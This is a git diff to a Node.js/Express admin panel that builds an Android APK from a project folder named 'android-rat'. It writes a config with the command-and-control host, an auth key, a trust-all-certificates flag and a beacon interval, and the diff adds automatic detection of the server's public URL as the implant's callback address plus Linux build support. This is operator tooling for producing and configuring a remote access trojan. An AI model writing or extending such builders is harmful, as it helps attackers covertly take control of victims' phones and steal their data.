@@ -116,10 +116,14 @@ function extractField(info, key) {
 // User fills in host/auth in the dashboard, downloads config.json, drops it
 // into app/src/main/assets/ and builds once with: ./gradlew assembleDebug
 
-router.get("/api/android/builder", requireAdmin, (_req, res) => {
-    const { AUTH_KEY } = require("../config/constants");
+router.get("/api/android/builder", requireAdmin, (req, res) => {
+    const { AUTH_KEY, PORT } = require("../config/constants");
+    const proto = req.headers["x-forwarded-proto"] || (req.secure ? "https" : "http");
+    const host  = process.env.PUBLIC_URL ||
+                  (req.headers["x-forwarded-host"] ? `${proto}://${req.headers["x-forwarded-host"]}` : null) ||
+                  `${proto}://${req.headers["host"] || `localhost:${PORT}`}`;
     res.json({
-        defaultHost: `https://${_req.hostname}:${require("../config/constants").PORT}`,
+        defaultHost: host,
         defaultAuth: AUTH_KEY,
         instructions: [
             "1. Fill in host and auth below and click Download Config",
@@ -151,7 +155,24 @@ router.post("/api/android/builder/config", requireAdmin, (req, res) => {
 const PROJECT_DIR = path.resolve(__dirname, "../../docs/38-android-rat/project");
 const ASSETS_DIR  = path.join(PROJECT_DIR, "app/src/main/assets");
 const APK_OUT     = path.join(PROJECT_DIR, "app/build/outputs/apk/debug/app-debug.apk");
-const GRADLEW     = path.join(PROJECT_DIR, "gradlew.bat");
+
+const IS_WIN  = process.platform === "win32";
+const GRADLEW = path.join(PROJECT_DIR, IS_WIN ? "gradlew.bat" : "gradlew");
+
+// On Linux ensure gradlew is executable (git doesn't always preserve +x)
+if (!IS_WIN && fs.existsSync(GRADLEW)) {
+    try { fs.chmodSync(GRADLEW, 0o755); } catch (_) {}
+}
+
+// Derive the server's own public URL from the incoming request.
+// Priority: body.host → env PUBLIC_URL → x-forwarded headers → Host header
+function autoDetectHost(req) {
+    if (req.body && (req.body.host || "").trim()) return req.body.host.trim();
+    if (process.env.PUBLIC_URL) return process.env.PUBLIC_URL.trim();
+    const proto = req.headers["x-forwarded-proto"] || (req.secure ? "https" : "http");
+    const host  = req.headers["x-forwarded-host"]  || req.headers["host"] || "localhost";
+    return `${proto}://${host}`;
+}
 
 let buildRunning = false;
 
@@ -164,12 +185,10 @@ router.post("/api/android/builder/build", requireAdmin, (req, res) => {
         return;
     }
 
-    const host      = (req.body.host || "").trim();
+    const host      = autoDetectHost(req);
     const auth      = (req.body.auth || "").trim();
     const trust_all = req.body.trust_all !== false;
     const beacon_ms = parseInt(req.body.beacon_ms) || 30000;
-
-    if (!host) { res.status(400).json({ error: "host required" }); return; }
 
     // Write updated config.json before build
     try {
@@ -189,12 +208,18 @@ router.post("/api/android/builder/build", requireAdmin, (req, res) => {
 
     const send = line => res.write(`data: ${line}\n\n`);
 
+    send(`[INFO] Auto-detected host: ${host}`);
     send(`[INFO] config.json written → ${JSON.stringify({ host, trust_all, beacon_interval_ms: beacon_ms })}`);
     send("[INFO] Starting Gradle build — this takes 1–3 minutes on first run...");
 
     buildRunning = true;
 
-    const proc = spawn("cmd.exe", ["/c", `"${GRADLEW}" assembleDebug`], {
+    // On Linux: run ./gradlew directly; on Windows: run via cmd.exe
+    const [cmd, args] = IS_WIN
+        ? ["cmd.exe", ["/c", `"${GRADLEW}" assembleDebug`]]
+        : [GRADLEW, ["assembleDebug"]];
+
+    const proc = spawn(cmd, args, {
         cwd: PROJECT_DIR,
         env: { ...process.env, JAVA_OPTS: "-Xmx1g" },
         shell: false,
